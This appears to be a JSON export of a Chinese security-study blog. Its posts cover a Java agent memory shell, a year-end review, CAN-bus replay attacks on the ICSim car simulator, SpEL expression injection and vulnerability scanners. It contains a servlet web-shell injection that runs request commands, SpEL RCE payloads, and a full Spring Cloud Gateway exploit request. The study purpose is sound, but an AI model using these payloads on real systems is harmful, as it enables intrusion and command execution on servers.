javax.servlet.ServletRequest req = request;\\n&quot; + &quot; javax.servlet.ServletResponse res = response;&quot; + &quot;String cmd = req.getParameter(\\&quot;cmd\\&quot;);\\n&quot; + &quot;if (cmd != null) {\\n&quot; + &quot;Process process = Runtime.getRuntime().exec(cmd);\\n&quot; + &quot;java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\\n&quot; + &quot;new java.io.InputStreamReader(process.getInputStream()));\\n&quot; + &quot;StringBuilder stringBuilder = new StringBuilder();\\n&quot; + &quot;String line;\\n&quot; + &quot;while ((line = bufferedReader.readLine()) != null) {\\n&quot; + &quot;stringBuilder.append(line + '\\\\n');\\n&quot; + &quot;}\\n&quot; + &quot;res.getOutputStream().write(stringBuilder.toString().getBytes());\\n&quot; + &quot;res.getOutputStream().flush();\\n&quot; + &quot;res.getOutputStream().close();\\n&quot; + &quot;}&quot;); byte[] byteCode = cc.toBytecode(); cc.detach(); return byteCode; } catch (NotFoundException | IOException | CannotCompileException e) { e.printStackTrace(); } } return new byte[0]; } } pom.xml 使用maven-assembly-plugin将依赖内容也一起打包 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;java_agent_memshell&lt;/groupId&gt; &lt;artifactId&gt;java_agent_memshell&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.26.0-GA&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;7&lt;/source&gt; &lt;target&gt;7&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;archive&gt; &lt;manifestFile&gt; src/main/resources/META-INF/MANIFEST.MF &lt;/manifestFile&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;attached&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; assembly:assembly打包处jar包 这只是一个简单的demo实现，想要拿到真实环境利用还要完善很多步骤，这里不再深入，如果以后要学agent内存马会在另起一篇文章。 总结 简单来说，java agent是一种插桩技术，使用两种不同的方式，都可以实现对应用程序的动态hook，利用 Instrumentation 做到完全无侵入，通过这种特性发展出了很多新型技术和产品。例：IAST和RASP 插桩技术可以很好的用于交互式应用检测与程序运行时的自我保护，它通过Java探针达到可以在执行代码底层分析上下文环境的能力。随着计算机各个方面性能的整体提高，也已成为当前安全监测中值得研究的一个方向。 ","link":"https://liangyueliangyue.github.io/post/java-agent-xue-xi/"},{"title":"2021年度总结","content":"回忆 从去年三月份刚开始学习Web安全到现在正好一年，勉强算刚刚入门吧。 正是去年的3月份我们一群人正式进入了学校的研究所，还记得刚开始给我们的任务就是盯着一本《Web安全攻防渗透测试实战指南》进行学习，整整学习了一个月。 然后就是一边上课，一边学习并进行漏洞分析，期间打打比赛，打打HW，做做渗透测试项目，一切都是井然有序 蜕变 在去年的11月份，经历了学长的多次面试（开始还以为只是查缺补漏，没有认真对待，后来才知道是正式的），结果并不如意。 一方面是面试让自己认识到了自己有很多不足的地方吧，然后也意识到后面要自己找工作了，学习的非常认真 也就是这一段时间收获了很多，完善了自己的知识面 开始参与教育src的漏洞挖掘，并获得南开大学和上海交通大学的漏洞挖掘报送证书 开始在cnvd上提交漏洞并获得Cnvd证书 * 4 开始审计github上小型的CMS框架并获得Cve * 4 加入先知社区并发表4篇文章 加入t00ls论坛并发表两篇文章 博客产出量大幅提高，平均两天一篇文章产出（查缺补漏） 遗憾 学习期间也打过大大小小的比赛，也获得过一些奖项，觉得比较遗憾的就是一场省赛因为自己的失误丢光了所有二进制的分数（自己还是队长），导致本来有机会一等奖进国赛的整个团队，只拿到了三等奖。虽然时间过去了挺久，但每每想到还是会很自责，所以还是痛定思痛，对待一切事情一定要认真负责。 也经历过很多面试，觉得还是有很多时候行动/态度不够积极，很多时候不敢去表现自己（老毛病了），还是要努力的改掉 生于忧患死于安乐，前半年来说过于安逸，坐井观天，才使得自己像井底之蛙一般。工作之后，还是要保持学习力，尽量紧跟并学习前沿技术 展望 现在是成功的拿到了一份安全研究的offer，希望能够安稳的度过实习期然后沉下心来继续学习，定下几个小目标吧 写一些有价值java安全工具分享到github，获得一些star 挖一些比较大型框架/组件的漏洞，拿几个不水的CVE 始终跟踪最新影响广泛漏洞，复现并进行分析 空闲的时间多看几本书 学习吉他 学会去做一些菜 热爱生活，热爱小颖！ ","link":"https://liangyueliangyue.github.io/post/2021-nian-du-zong-jie/"},{"title":"汽车安全测试学习","content":"汽车安全测试 CAN controller area network - 汽车所有/某些 部件之间进行通信的中枢 CAN流量是通过UDP而不是TCP进行传输的 OBD 要访问汽车的CAN总线，您必须能够访问驾驶室诊断端口。虽然当前的诊断标准和端口有数百种之多，但如今OBD-II已经成为了事实标准，几乎所有汽车都使用这种诊断端口。实际上，汽车修理工诊断汽车故障时，使用的就是它。通过OBD可以直接访问CAN，并且是最直接的方式。另外，OBD-II也很容易找到：通常位于前排乘客或驾驶员座位附近的某个地方，而且不需要螺丝刀就能连接使用。 安装SDL库 sudo apt-get install libsdl2-dev libsdl2-image-dev -y 环境安装 安装Can-utils sudo apt-get install can-utils -y Can-utils主要由5个工具组成： cansniffer：用于嗅探数据包 cansend：用于编写数据包 candump：转储所有下载的数据包 canplayer：用于重放CAN数据包 cangen：用于创建随机的CAN数据包 下载表盘模拟器 git clone https://github.com/zombieCraig/ICSim 准备虚拟CAN网络 通过浏览ICSim目录，可以找到有一个叫setup_vcan.sh的shell脚本： 我们可以运行下面的命令，来设置一个虚拟接口： ./setup_vcan.sh 要验证vcan0接口是否能够正常工作 ifconfig vcan0 模拟器运行 现在，终于可以运行模拟器了。不过，要想运行ICSim模拟器，至少需要两个组件：一个仪表盘和一个控制器，这样才能模拟加速、刹车、门控、转向灯等。另外，操作过程中，我们至少需要3个终端窗口，其中两个窗口分析显示仪表盘、控制器，另一个窗口执行其他命令。 首先编译刚刚git下载的项目 make 控制面板的执行 要运行控制面板，你必须运行一个名为icsim的文件，参数为vcan0（我们之前创建的接口）： ./icsim vcan0 到目前为止，仪表板将不会有任何动作，包括速度表、灯光、刹车或车门。这是因为vcan0接口还没有动作，为了模拟它，我们必须启动控制器。 控制面板可以通过以下命令启动： ./controls vcan0 Vcan0是虚拟的CAN接口，ICSim将通过它发送和接收CAN帧。一旦启动控制面板，速度表会出现一些波动。这是由于控制面板所模拟的噪音而造成的。 启动控制面板后，我们就可以使用键盘上的按键来模拟各种运动。 使用以下组合键，可以对ICSim控制面板进行相应的修改： 一旦按下向上箭头和向左箭头键，就会看到左转向灯闪烁 CAN报文 上图展示的是我们记录下来的CAN报文。如果按列看的话，第一列是接口，第二列是仲裁ID，第三列是CAN报文的大小，它不能大于8（如果你考察一下CAN帧的话，就明白为什么不能大于8了），第四列是CAN数据本身。 一旦我们理解了CAN报文，我们就可以进一步通过ODB-II向CAN总线注入修改过的数据包，以篡改速度表或其他东西。 在我们开始展示ICSim之前，让我们看看其他工具是如何工作的。为此，我们首先要配置一下虚拟接口。 设置虚拟CAN接口 sudo modprobe can 上述命令将为CAN加载内核单元。此外，我们还需要为虚拟机加载内核单元。 sudo modprobe vcan 我们可以通过下面的命令，来验证是否加载了所需的内核单元： lsmod | grep can 该命令将显示是否加载了CAN和VCAN。 现在，我们来配置虚拟接口： sudo ip link add dev vcan0 type vcan sudo ip link setup vcan0 我们可以通过以下命令，来验证虚拟CAN接口是否已经配置成功： ifconfig vcan0 一旦配置好了虚拟CAN接口，就可以通过该接口发送/接收CAN数据包了。现在，让我们使用一个名为CANEN的can-utils实用程序来创建虚拟CAN数据包。 cangen-创建can帧 实际上，cangen可以为教育用途而创建各种CAN帧。 要使用cangen，你必须指定用于创建CAN帧的接口。 cangen vcan0 Vcan0是我们之前创建的虚拟CAN接口。 既然已经创建了CAN帧，接下来，我们不妨看看这个帧到底长啥样。实际上，有很多工具可以用来查看帧，其中之一就是Wireshark。为此，我们可以在创建完CAN帧后，启动Wireshark。 其中，vcan0是用来创建CAN帧的接口。一旦点击了数据包对应的接口，就会显示CAN帧的内容。此外，我们还可以查看关于CAN帧的详细信息。 查看can帧 wireshark 在vcan0里面还有其他的实用工具，比如cansniffer和candump，它们的作用和Wireshark差不多 candump candump vcan0 对于各列，简单介绍如下：第一列是CAN接口，第二列是ID，第三列是CAN报文的大小，第四列是报文本身。 此外，candump还可以用来记录帧。在进行重放攻击时，需要先记录相应的帧，然后，用canplayer这样的小工具来重放这些帧。为了记录CAN帧，可以添加命令选项-l。 candump -l vcan0 当记录CAN帧时，将创建一个前缀为candump的文件，后跟创建日期。 如果想查看文件的内容，可以在Linux上使用cat命令 我们使用candump记录的数据可以使用canplayer之类的实用程序进行播放。 canplayer-播放can数据 顾名思义，canplayer可以用来播放CAN帧；当您需要进行重放攻击时，该工具就会派上用场了。首先，需要记录CAN帧，然后，使用canplayer播放这些CAN帧。 假设我们想要篡改转速表，但是，我们不知道转速表读数对应于哪个ID，也不知道对应的CAN报文中含有哪些内容。理想情况下，您应该首先使用带有标志-l的candump命令来丢弃和记录帧，然后使用canplayer播放记录的帧。 使用输入文件时，需要为Canplayer命令提供-i选项： canplayer -I canfile.log 除此之外，canplayer还有其他几个非常有用的选项，大家可以通过man canplayer命令来学习它们。 cansniffer-过滤can数据 使用CAN嗅探器来查看CAN数据的变化。这对于查看特定字节的变化是非常有用的。Cansniffer有一个-c选项，能够通过颜色来展示字节的变化。这个工具的工作方式为：比较字节当前值和之前的值，如果存在差异，就用字节的颜色变化来加以表示。当你想知道当对汽车进行的操作是否导致CAN数据发生变化时，这个功能会非常有用。 cansniffer -c vcan0 我发现cansniffer非常有用，因为它还可以进行ID过滤。因此，如果只想查看来自某个特定ID的帧，比如说0x011，你可以根据ID进行过滤。 在开始嗅探时，我们可以先按-，后跟00000000，这将清除所有的帧；然后，使用+添加要过滤的ID，按回车。这样你就可以过滤相应ID的帧了。 cansend-发送can数据 Cansend用于将CAN帧发送到一个特定的CAN接口。 cansend interface frame 我们将在ICSim中用到所有这些工具。 ICSim实战 我们已经在第一篇文章中介绍了如何安装ICSim。现在，让我们启动ICSim并嗅探CAN帧。 ./icsim vcan0 ./controls vcan0 如果您已经严格执行了上一篇文章中介绍的步骤，现在就应该能够看到上面的输出内容。你可能还注意到，速度表指针会来回抖动，这是由于噪音造成的，是很正常的现象。 嗅探由ICSim创建的CAN帧 我们将使用can-utils提供的cansniffer工具来捕获数据包。下面，我们可以打开一个新的终端，用以下命令来启动cansniffer： cansniffer -c vcan0 命令选项-c的作用，是用颜色指示帧字节的变化情况。 CAN帧的变化非常快，这是因为有大量数据高速传输。在一辆真正的汽车中，这是非常常见的。 为此，我们可以使用ID进行过滤。如果你想只考察ID为40C的帧，你可以先按-，然后按00000000，再按回车键，以从cansniffer中删除所有的ID对应的数据；然后，按+，然后按要过滤的ID，再按回车键即可。 这里，我用上面提到方法过滤了ID为40c的帧。我们可以试着按向上的方向键来加油门，然后观察CAN帧的变化速度。在这里，变化是通过颜色来指示的。大家可以多尝试一下。 重放攻击 理解如此庞大的数据将是相当困难的。另外，从这个大量的数据中找到所需帧的ID也是不可能的。 因此，你需要捕获数据包，然后执行一些操作，比如打开闪光灯或在连接后踩油门，然后分割数据包，进行重放攻击，看看是否有效。 现在，我们要用ICSim执行重放攻击，前提是已经启动了ICSim，并且能够用cansniffer查看帧。现在，我们将使用带有-l选项的candump命令来记录和保存帧，与此同时，我们将通过按左、右方向键来加油门，以激活闪光灯。 candump -l vcan0 现在，停止candump，我们将看到一个candump-XXXXX.log文件被创建。 重放CAN帧 为了重放这些数据包，我们将使用canplayer工具。由于我们要使用一个文件作为canplayer工具的输入，所以，我们需要启用-I选项。 canplayer -I candump-2019XXXXXX.log 你可以看到，重放攻击已经发生了，闪光灯以及速度表应该像我们之前那样工作。 在真实的汽车中，CAN总线可能会复杂得多，而且CAN帧的出现速度也会快得多，所以定位ID可能相当困难。因此，为了方便识别ID，你可以按照下面的步骤进行操作 分割CAN帧并执行重放攻击 如果你想把CAN帧分成两份，并分别进行重放攻击，最好的方法是使用candump捕获CAN帧，并使用工具wc来计算CAN帧的数量，然后使用split把它平均分成两份。 现在，你可以使用canplayer来单独重放这些CAN帧。 好了，本系列的第二篇文章到此就要结束了。我们已经表明，一旦我们能够进入车辆并执行一些动作，如加油门、打开转向灯和打开车门，我们就可以进行进一步的安全测试。因此，通过一些程序和低成本的组件，我们能够获得一辆车的全部访问权限。 SavvyCAN 如今，已经有很多种软件都可以用于监控和过滤CAN通信。其中，有昂贵的专有工具，也有免费的开源工具。 这篇文章的目的，是向大家介绍如何免费对汽车进行安全测试，所以，昂贵的工具不在我们的介绍范围之内。 在前面的文章中，我已经详细介绍了这些昂贵的CAN通信工具的廉价和免费的替代品。实际上，像can-utils、Wireshark这样的工具就非常好用。 但是，SavvyCAN为我们提供了更多的功能。对于初学者来说，它提供了一个很好的GUI，可以帮助你轻松地浏览、过滤数据包、ID等。对于那些已经进入汽车安全测试领域的人来说，SavvyCAN提供了真正伟大的功能——我个人最喜欢的功能包括以脚本方式来处理CAN帧。 下面，让我们来看看官方网站对SavvyCAN的定义： “SavvyCAN是一个基于多个QT平台的C++程序，主要用于CAN数据的逆向分析和捕获。它最初是为了介绍EVTVDue和CANDUE等EVTV硬件的用法而编写的。此后，它被扩展到适用于任何socketCAN兼容设备，以及Macchina M2和Teensy 3.x板。它可以同时捕获并发送至多个总线和CAN摄像机。” 与can-utils相比，SavvyCAN非常容易上手。还是那句话，争论哪个工具最好，哪个工具不好是没有意义的，主要看是否适合自己。 在Ubuntu上安装和运行SavvyCAN wget https://github.com/collin80/SavvyCAN/releases/download/V199.1/SavvyCAN-305dafd-x86_64.AppImage 下载appimage时，无需安装，直接运行相应的可执行文件即可！ chmod 744 SavvyCAN-305dafd-x86_64.AppImage ./SavvyCAN-305dafd-x86_64.AppImage 我们建议大家不妨花点时间来熟悉SavvyCAN的界面。如果您想在Macchina M2或其他兼容的硬件上使用SavvyCAN，无需额外安装任何东西。 我们打算将SavvyCAN与ICSim搭配使用，所以，我们还需要安装qtserialbus。 打开SavvyCAN窗口后，导航到Connection -&gt; Open Connection Window -&gt; Add New Connection选项，会发现qtserialbus是处于关闭状态的。 为了在SavvyCAN中使用qtserialbus，首先需要完成相应的安装工作。 安装qt5 wget https://download.qt.io/archive/qt/5.14/5.14.2/qt-opensource-linux-x64-5.14.2.run 下载qt5后，我们需要安装/运行它，具体命令如下所示： chmod a+x ./qt-opensource-linux-x64-5.14.2.run ./qt-opensource-linux-x64-5.14.2.run 这里需要注册或者登录，记下路由名称，因为后面会用到的。 一旦安装了qt5，接下来就得安装qtserialbus了，因为该软件没有包含在官方的Ubuntu存储库中，所以，我们还得自己动手，才能丰衣足食。 安装qtserialbus sudo apt install qtdeclarative5-dev qttools5-dev g++ git clone https://github.com/qt/qtserialbus cd qtserialbus /home/y0g3sh/Qt5.14.2/5.14.2/gcc_64/bin/qmake . make sudo make install 编译SavvyCAN 为了使用qtserialbus，我们还需要通过qmake编译之前下载的SavvyCAN的AppImage文件，具体命令如下所示： git clone https://github.com/collin80/SavvyCAN cd SavvyCAN /home/y0g3sh/Qt5.14.2/5.14.2/gcc_64/bin/qmake CONFIG += debug make 注意，安装过程可能需要一些时间，请耐心等待。 安装就绪后，请启动ICSim模拟器，以及除can-utils以外的所有工具——在这里，我们不会借助于can-utils来记录CAN通信，而是使用SocketCAN。 原理和can-utils一样，只不过图形界面更加直观以及方便 总结 CAN操作 创建 重放 过滤 发送 通过OBD-II获得对CAN的访问权限 真实环境操作 嗅探CAN流量 ICsim模拟 wireshark/candump嗅探 CAN流量的分析与逆向工程 数据包分析 第一列是接口 第二列是仲裁ID 第三列是CAN报文的大小 第四列是CAN数据本身。 重放攻击 candump记录can包 canplayer重放can包 参考 https://en.iguru.gr/car-hacking-apolytos-odigos-part/ https://en.iguru.gr/car-hacking-apolytos-odigos-part-2/ https://en.iguru.gr/car-hacking-apolytos-odigos-part-iii/ ","link":"https://liangyueliangyue.github.io/post/qi-che-an-quan-ce-shi-xue-xi/"},{"title":"SpEL表达式注入漏洞学习","content":"SpEL表达式注入漏洞 前言 因为前端时间的spring gateway rce正是由此导致的所以来学习一下 介绍 Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于统一EL，但提供了额外的功能，是方法调用和基本的字符串模板了同时SpEL是API接口的形式因为创建的，所以允许将其集成到其他应用程序和框架中。 环境搭建 https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce 下载之后用idea打开等待依赖关系解决完，然后配置springboot启动项 运行后访问 http://localhost:9091/ SpEL表达式使用 SpEL定界符——#{} SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。如果是 #{ 开头同时 } 结尾，就会进入到 SPEL 解析 这里需要注意#{}和${}的区别： #{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行； ${}主要用于加载外部属性文件中的值，在Spring Boot 很早版本的一个SpEL表达式注入中就是依赖${}触发的 两者可以混合使用，但是必须#{}在外面，${}在里面，如#{'${}'}，注意单引号是字符串类型才添加的 简单demo public class Test { public static void main(String[] args) { //创建ExpressionParser解析表达式 ExpressionParser parser = new SpelExpressionParser(); //SpEL表达式语法设置在parseExpression()入参内 Expression exp = parser.parseExpression(&quot;'hello world'&quot;); //执行SpEL表达式，执行的默认Spring容器是Spring本身的容器：ApplicationContext Object value = exp.getValue(); System.out.println(value); } } 具体步骤如下： 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现； 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象； 构造上下文：准备比如变量定义等等表达式需要的上下文数据； 求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值； 主要接口 ExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符； EvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。 Expression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。 利用方法1-类类型表达式T(Type) 在SpEL表达式中，使用T(Type)运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。 使用T(Type)来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。 public class Test { public static void main(String[] args) { //创建ExpressionParser解析表达式 ExpressionParser parser = new SpelExpressionParser(); //SpEL表达式语法设置在parseExpression()入参内 Expression exp = parser.parseExpression(&quot;T(java.lang.Math)&quot;); //执行SpEL表达式，执行的默认Spring容器是Spring本身的容器：ApplicationContext Object value = exp.getValue(); System.out.println(value); } } 返回了Math类 那么尝试直接调用Runtime类中的exec方法 Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('calc')&quot;); 成功弹出了计算器 利用方法2-直接new对象使用 public class Test { public static void main(String[] args) { //创建ExpressionParser解析表达式 ExpressionParser parser = new SpelExpressionParser(); //SpEL表达式语法设置在parseExpression()入参内 Expression exp = parser.parseExpression(&quot;new java.lang.ProcessBuilder('cmd','/c','calc').start()&quot;); //执行SpEL表达式，执行的默认Spring容器是Spring本身的容器：ApplicationContext Object value = exp.getValue(); System.out.println(value); } } 也能够命令执行 为什么不适用Runtime类？ 因为Runtime类没有构造方法，只能通过getRuntime的方法去获得 回显问题 模拟真实环境中SpEL注入，如何自己构造回显了 简单demo @RestController @EnableAutoConfiguration public class Index { @ResponseBody @RequestMapping(value = &quot;/spel&quot;, method = {RequestMethod.GET, RequestMethod.POST}) public String spel(String input){ SpelExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(input); return expression.getValue().toString(); } } 这时候使用SpEL模板表达式会报错 需要换一下SpEL的写法，否则会因为没有使用模板解析表达式，在传入#{后出现报错。 @RestController @EnableAutoConfiguration public class Index { @ResponseBody @RequestMapping(value = &quot;/spel&quot;, method = {RequestMethod.GET, RequestMethod.POST}) public String spel(String input){ SpelExpressionParser parser = new SpelExpressionParser(); TemplateParserContext templateParserContext = new TemplateParserContext(); Expression expression = parser.parseExpression(input,templateParserContext); return expression.getValue().toString(); } } 成功命令执行 现在我们尝试执行whoami 返回的也只是类对象 因为我们可以随意创建对象并调用方法，所以可以利用java原生类来进行构造 Scanner input=#{new java.util.Scanner(new java.lang.ProcessBuilder(&quot;cmd&quot;, &quot;/c&quot;, &quot;whoami&quot;).start().getInputStream(), &quot;GBK&quot;).useDelimiter(&quot;lyy9&quot;).next()} 原理在于Scanner#useDelimiter方法使用指定的字符串分割输出，这里给不可能出现的字符串即可，就会让所有的字符都在第一行，然后执行next方法即可获得所有输出。 成功回显 spring gateway rce 回显 POST /actuator/gateway/routes/hacktest HTTP/1.1 Host: 192.168.159.132:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close Content-Type: application/json Content-Length: 333 { &quot;id&quot;: &quot;hacktest&quot;, &quot;filters&quot;: [{ &quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: { &quot;name&quot;: &quot;Result&quot;, &quot;value&quot;: &quot;#{new java.util.Scanner(new java.lang.ProcessBuilder('/bin/sh','-c', 'id').start().getInputStream(), 'GBK').useDelimiter('lyy9').next()}&quot; } }], &quot;uri&quot;: &quot;http://example.com&quot; } 步骤就不介绍了，可以看之前的漏洞文章，最后也能成功回显 不过spring gateway的回显关键点并不在这，还是filter中的AddResponseHeaderGatewayFilterFactory可以向response 中写入执行结果，因此恰好满足回显要求 漏洞原理 其实就是SpEL本身带有强大功能，如果不做限制就会导致rce SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext： SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。 StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。 在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)或者直接new来调用任意对象的任意方法，成功造成任意命令执行。 ","link":"https://liangyueliangyue.github.io/post/spel-biao-da-shi-zhu-ru-lou-dong-xue-xi/"},{"title":"漏洞扫描器学习","content":"工作原理 漏洞扫描器向目标计算机发送数据包，然后根据对方反馈的信息来判断对方的操作系统类型、开发端口、提供的服务等敏感信息。 端口扫描原理： 端口扫描的原理其实非常简单，简单的利用操作系统提供的connect()系统调用（有各种协议），与目标计算机的端口进行连接。如果端口处于侦听状态，那么connect()能够成功，否则，这个端口是不能用的，就是没有提供服务。 漏洞扫描原理 检测扫描目标主机中可能大量已知的漏洞，如果发现潜在漏洞可能，就报告扫描者。这种扫描器的威胁更大，因为黑客可以直接利用扫描结果进行攻击。 理解 目标为ip 操作系统识别 端口扫描 开放的服务 服务版本 服务漏洞精准poc web站点 web指纹识别 确认web指纹 poc打击+漏洞扫描 非开源项目 漏洞扫描 漏洞扫描 目录扫描 目录树 信息搜集 js等静态文件中获取 组件版本识别 登录页面查找 功能点测试 sql注入 xss 逻辑漏洞等 区别 也可以优缺点结合，采用AWVS接口去爬虫，Xray去漏扫 被动+主动扫描器 xray golang开发 通过代理模式进行被动扫描 代理模式下的基本架构为，扫描器作为中间人，首先原样转发流量，并返回服务器响应给浏览器等客户端，通讯两端都认为自己直接与对方对话，同时记录该流量，然后修改参数并重新发送请求进行扫描。这种原理和Burpsuite的自带的漏扫原理是一样的。 webscan --listen监听本地端口 爬虫模式主动扫描 webscan --basic-crawler 因为被动扫描的特性（设置代理即可） 可以xray+burp xray+awvs xray+appscan 优点 支持主动、被动多种扫描方式 自备盲打平台 可以灵活定义 POC 支持Windows /macOS /Linux 多种操作系统 缺点 容易造成差错 如修改密码重发，添加文章重发等 不进行指纹识别直接上特定组件poc poc编写 name: poc-yaml-example-com rules: - method: GET path: &quot;/update&quot; expression: &quot;true&quot; search: | &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;(.+?)&quot; - method: POST path: &quot;/update&quot; body: | id=';echo(md5(123));//&amp;csrftoken={{1}} expression: | status == 200 &amp;&amp; body.bcontains(b'202cb962ac59075b964b07152d234b70') 目标漏洞是一个简单的代码执行，但因为是POST请求，所以需要先获取当前用户的CSRF Token。所以，我们的POC分为两个Rule，第一个Rule发送GET请求，并使用search指定的正则提取返回包中的csrftoken表单值，此时expression直接执行表达式true，表示第一条规则一定执行成功；第二个Rule发送POST请求，此时，我们可以在path、body、headers中使用前一个规则search的结果，如{{0}}、{{1}}等。 所以其实就是根据yaml文件构造请求，然后通过返回包数据判断 也不能做到更复杂的利用POC 也可以用在线网站编写 https://phith0n.github.io/xray-poc-generation/ Goby go开发，跨平台 原理 Goby是一款基于网络空间测绘技术的新一代网络安全工具，它通过给目标网络建立完整的资产知识库，进行网络安全事件应急与漏洞应急。 Goby可提供最全面的资产识别，目前预置了超过10万种规则识别引擎，能够针对硬件设备和软件业务系统进行自动化识别和分类，全面的分析出网络中存在的业务系统。Goby可提供最快速对目标影响最小的扫描体验，通过非常轻量级地发包能够快速的分析出端口对应的协议信息。Goby也为安全带来了高效，Goby预置了最具攻击效果的漏洞引擎，覆盖Weblogic，Tomcat等最严重漏洞。并且每日更新会被用于真实攻击的漏洞。 优点 速度快 系统扫描+应用扫描 截图验证非常直观 自定义poc，自定义字典 支持子域扫描 POC编写 依赖查询规则 app=“Ruijie-NBR-Router” 图形化填写，然后生成json文件 主动扫描 appscan 基于站点的扫描 工作原理 1）通过“探索”功能，利用HTTP Request和Response的内容，爬行出指定网站的整个Web应用结构 2）AppScan本身有一个内置的漏洞扫描的规则库，可随版本进行更新。从探索出的url中，修改参数or目录名等方式，构造不同的url对照组向服务器发送请求or攻击 3）根据HTTP Response返回的内容，和正常请求所返回的响应作对比，是否产生差异性，而这种差异性又是否符合扫描规则库的设定规则，以此来判断是否存在不同类型的安全漏洞 4）若APPScan可判断存在安全漏洞，则对这些漏洞的威胁风险给出说明，进行严重程度提示，并给出修复的建议和方法，以及漏洞发现的位置提示 优点 详细，监测问题比较全，树结构清晰明了 可自定义扫描策略 准确率高 验证方便，内置请求数据包对比清晰可见 xss详细，可测出单一浏览器的xss 可进行登录扫描 缺点 速度慢 占用内存大，持续时间过长容易出现卡顿 仅windows sqlmap 后面会跟代码分析单独写一篇 nessus Nessus采用客户/服务器体系结构，客户端提供了运行在window 下的图形界面，接受用户的命令与服务器通信，传送用户的扫描请求给服务器端，由服务器启动扫描并将扫描结果呈现给用户;扫描代码与漏洞数据相互独立，Nessus 针对每一个漏洞有一个对应的插件，漏洞插件是用NASL(NESSUS Attack Scripting Language)编写的一小段模拟攻击漏洞的代码，这种利用漏洞插件的扫描技术极大的方便了漏洞数据的维护、更新 Nessus 具有扫描任意端口任意服务的能力 以用户指定的格式(ASCII 文本、html 等)产生详细的输出报告，包括目标的脆弱点、怎样修补漏洞以防止黑客入侵及危险级别。 Nessus的可延伸性使得扫描更具有发展空间，因为它随意增加原本没有的侦测模式，也就是可以自定义插件 优点 可拓展 主要用于系统层扫描 扫描速度快，准确率高，漏洞规则库全面，报表功能强大 缺点 但是应用层不是很好 Awvs 工作原理 扫描整个网络，通过跟踪站点上的所有链接和robots.txt来实现扫描，扫描后AWVS就会映射出站点的结构并显示每个文件的细节信息。 在上述的发现阶段或者扫描过程之后，AWVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程（用自定义的脚本去探测是否有漏洞） 。AWVS分析每一个页面中需要输入数据的地方，进而尝试所有的输入组合。这是一个自动扫描阶段 。 在它发现漏洞之后，AWVS就会在“Alerts Node(警告节点)”中报告这些漏洞，每一个警告都包含着漏洞信息和如何修补漏洞的建议。 